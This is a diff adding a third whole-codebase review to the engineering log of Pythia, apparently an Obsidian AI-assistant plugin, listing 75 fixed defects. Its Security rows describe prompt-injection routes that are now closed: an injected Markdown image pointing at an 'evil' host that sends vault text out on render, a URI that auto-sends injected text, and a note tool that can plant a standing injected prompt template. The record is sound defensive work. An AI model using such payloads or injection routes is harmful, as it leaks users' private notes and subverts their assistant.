@@ -1,6 +1,8 @@
 # Engineering Review — Pythia
 
-*Updated: 2026-09-26 — **Glossary save fixed:** a re-lookup no longer deletes frontmatter keys Pythia did not write (`replaceBody`), so a term note can carry another plugin's or the user's properties.*
+*Updated: 2026-09-28 — **Third whole-codebase review (ADR-240): 75 defects fixed** across security, providers, persistence, UI and tooling; three new principles (7–9) in CLAUDE.md. Two items deferred (D-68, D-69).*
+
+*Previously: 2026-09-26 — **Glossary save fixed:** a re-lookup no longer deletes frontmatter keys Pythia did not write (`replaceBody`), so a term note can carry another plugin's or the user's properties.*
 
 *Previously: 2026-09-26 — **#258 done (ADR-232):** *What Pythia sends* shows a conversation's instructions, template, custom instructions, history and whole system prompt. Six rows about the embedding index (#269, #273, #274, #275, #282 and the phone-embedding row) closed as obsolete by ADR-224.*
 
@@ -2078,3 +2080,66 @@ A comparison of `services/WebSearchService.ts` with Tavily's API found Pythia us
 | Item | Severity | Status |
 |---|---|---|
 | **A re-lookup deleted every frontmatter key that was not Pythia's.** `GlossaryService.save` wrote `renderBody(merged)` over the whole file with `vault.modify`, so the frontmatter block was gone before `processFrontMatter` re-added Pythia's own keys. Lost on every re-lookup: `tags`, `cssclasses`, any property set by hand, another plugin's keys, and the `definition_<lang>` / `translated_from` cache of a `manual` definition the lookup kept. The method's own comment promised the opposite. Surfaced while planning Schreibstube reading the glossary folder as its term source, which needs a `schreibstubeAvoid` property on the same note to survive. | High | **Fixed.** `replaceBody` (pure, `services/glossaryNotes.ts`) swaps the body and keeps the block byte for byte, applied through `vault.process`. `tests/glossarySave.test.ts` runs `save` over an in-memory vault; its two property tests fail on the old write. |
+
+## Review — third whole-codebase review (ADR-240), 2026-09-28
+
+Six parallel reviews; every finding verified against the code before it was fixed. Grouped rows count more than one defect (75 in all).
+
+| Area | Item | Severity | Status |
+|---|---|---|---|
+| Security | **Rendered answers fetched remote images at once** — an injected `![](https://evil/?d=…)` exfiltrated vault text with no click and no tool call. | High | Fixed: `ui/remoteMedia.ts` defers remote media before rendering; a placeholder names the host and loads on press. One render entry point, tested. |
+| Security | **`obsidian://pythia?cmd=inject` auto-sent its text** as the user's message, arming auto-search and admitting its links to `read_url`. | Medium-High | Fixed: prefilled, the user presses Send. |
+| Security | **`create_note` could write a prompt template**, planting a standing injection with `context_notes` as rewrite targets; the chip named only the file. | Medium | Fixed: `declaresPythiaTemplate` refuses it; the chip shows the whole path. |
+| Security | **Every link printed in a fetched page became readable** (`addText(result.text)`). | Low-Medium | Fixed: `WebReadScope.addResults` admits only returned addresses. |
+| Security | **IPv4-compatible (`::7f00:1`) and site-local (`fec0::/10`) IPv6 judged public.** | Low | Fixed in `isPrivateHost`. |
+| Providers | **Stop was retried and reported as a network error** — the SDKs' `APIUserAbortError` has `name === "Error"`. | High | Fixed: `isAbortError(err, signal)` is the one rule. |
+| Providers | **Stop could not end a pending write confirmation**; a later click still wrote the note. | High | Fixed: the confirm settles declined on abort; `ToolCancelledError` is thrown before each tool. |
+| Providers | **Mistral dropped streamed content chunks** (Magistral answered nothing). | High | Fixed: `mistralContentText` for stream and utility. |
+| Providers | **A missing key was retried and shown as a network error**; any status-less error was retried. | Medium | Fixed: `getClient()` before the loop; only real connection errors are `network`. |
+| Providers | **OpenAI utility calls on reasoning models came back empty.** | Medium | Fixed: low reasoning effort; an empty `length` stop is logged. |
+| Providers | **Magistral was sent a temperature it does not support.** | Medium | Fixed: `sendTemperature()` reads `parameterSupport` in all three providers. |
+| Providers | **Usage and the truncated flag were lost on Stop.** | Medium | Fixed. |
+| Providers | **Note excerpt budgets were not enforced** (a 50 000-char section sent against 3 000). | Medium | Fixed: hard ceiling in `noteChunking`. |
+| Providers | **History trimming ignored the new message.** | Low-Medium | Fixed. |
+| Providers | **`$&` in a prompt corrupted the optimizer text.** | Low-Medium | Fixed: `fillPromptPlaceholder`. |
+| Providers | **Two silent catches** (vault lookup, optimizer YAML). | Low | Fixed: logged. |
+| Persistence | **A dirty mark set during an in-flight write was cleared by it** — the newest turn lost on quit. | High | Fixed: per-id mark counter. |
+| Persistence | **`applyCap` assigned a list computed before its awaits** — a conversation created meanwhile vanished, a deleted one came back. | High | Fixed: filters the live list. |
+| Persistence | **Resume set summary mode before the summary existed**; a failure left the model with no context. | Medium-High | Fixed: mode written after success. |
+| Persistence | **A new conversation could be evicted by the write that created it.** | Medium | Fixed: protected for the session; a skipped save is logged. |
+| Persistence | **Glossary cache rebuilt before Obsidian re-parsed frontmatter.** | Medium | Fixed: `metadataCache.changed` invalidates. |
+| Persistence | **Conversation overrides, `pendingRewrite`, `researchMode`, `vaultContext`, a message's `rewriteTarget`/`tokenUsage` and comparison candidates were not validated on load.** | Medium | Fixed: `normalizeAnswerFields` + `sanitizeOverrides`. |
+| Persistence | **The large-store Notice repeated on every sync reload.** | Medium | Fixed: once per session. |
+| Persistence | **Numbers from data.json were never range-checked.** | Low | Fixed: `NUMBER_SETTING_BOUNDS`. |
+| Persistence | **The 200→450 cap migration ran on every load**; legacy key migrations and Electron decryption lingered. | Low | Removed with all pre-3.x migrations (no backwards compatibility). |
+| Persistence | **`spliceExchange` moved the save boundary by two when it fell inside the exchange.** | Low | Fixed. |
+| Persistence | **A glossary save could drop an alias added by hand seconds earlier.** | Low | Fixed: `withListsOnDisk`. |
+| Persistence | **Unload did not flush the settings debounce or queued renames.** | Low | Fixed. |
+| Persistence | **`initLeaf` closed a second Pythia leaf the user opened.** | Low | Fixed: only same-group hot-reload duplicates. |
+| Persistence | **Four copies of the key setter** in `SecretStore`; an unreadable secret threw. | Low | Fixed: one `setKey(kind)`; logged. |
+| UI | **Two full renders interleaved** into one message list on a conversation switch. | High | Fixed: render generation. |
+| UI | **Render children accumulated on the view** for its life. | High | Fixed: `RenderSlot` per rebuild, comparison body and answer tab. |
+| UI | **Leaked document listeners, ResizeObserver and pin body on close.** | Medium | Fixed in `onClose` / `PinController.dispose`. |
+| UI | **Late by-meaning results landed in the related list**; the timer fired after close. | Medium | Fixed: list generation. |
+| UI | **The auto title overwrote a rename made meanwhile.** | Medium | Fixed. |
+| UI | **A summary was written to a replaced conversation object.** | Medium | Fixed: written through the store. |
+| UI | **A swipe-to-dismiss starting on a sheet row ran the row.** | Medium | Fixed. |
+| UI | **Delete/Compare fired on touchstart** — a scroll starting on Delete deleted. | High | Fixed: click + `attachOutsideDismiss`. |
+| UI | **Retry was not re-checked at press time** — a favorite added after the card was drawn was deleted. | High | Fixed: `isRetryWithheld`. |
+| UI | **A `#` chip could detach a note attached earlier, and tracking crossed conversations.** | High | Fixed. |
+| UI | **Apply/Discard of a rewrite disarmed another passage** and did not persist. | Medium | Fixed: `sameRewriteTarget`. |
+| UI | **Enter submitted during IME composition** (three surfaces); the prompt modal sent on plain Enter. | Medium | Fixed; `composerKeyAction` in the modal. |
+| UI | **A long-press left the fork anchor swallowing the next tap** on touch. | Medium | Fixed. |
+| UI | **A favorite starting at an element boundary painted the wrong occurrence.** | Medium | Fixed: `boundaryTextOffset`. |
+| UI | **The search snippet did not contain the match** in a long line. | Low | Fixed: `snippetWindow`. |
+| UI | **Navigator showed "none" with items left; the # picker scanned the vault per keystroke.** | Medium | Fixed. |
+| UI | **Unhandled rejections in five click handlers; two super-linear regexes on model text.** | Low | Fixed: `noticeFailure`; linear scans. |
+| UI | **Keyboard access and names**: popover rows, navigator, history icons, selection toolbar, banners, pills, inspector links, × and trash buttons. | Medium | Fixed: `makeKeyActivatable`, aria-labels, focus ring. |
+| UI | **`openLinkText` on a term note that may be gone** (creates it); the truncation card read `conv.model`; formal German in pins. | Low | Fixed. |
+| Tooling | **`minAppVersion` 1.4.0 while `secretStorage` needs 1.11.4.** | High | Fixed in the manifest; the next `versions.json` row carries it. |
+| Tooling | **The release workflow shipped without lint or tests.** | High | Fixed: the four CI steps; `persist-credentials: false`. |
+| Tooling | **Engine leftovers**: `.npmrc` (npm warned on every call), protobufjs allow-script, dependabot rule, workflow comments; unused `@vitest/coverage-istanbul`, `tslib`, `importHelpers`. | Low | Removed. |
+| Tooling | **Compiler and lint gaps.** | Low | `noImplicitOverride` (29 `override`s), `isolatedModules`, `allowUnreachableCode/UnusedLabels: false`, `--max-warnings 0`; `add-paths` on the pricing PR. |
+| Tooling | **Dead exports** (`evictConversations`, `applyRelevanceFloor`, `tokenMatches`, `scoreRelevanceWeighted`, `looksTimeSensitive`, `insertTokens`, `PluginData`, `REASONING_MODELS`×2) and stale docs (AGENTS.md file map, the Mistral/OpenTelemetry comment). | Low | Removed / corrected. |
+
+**Deferred:** D-68 (one provider instance for every view), D-69 (remote images in written notes).
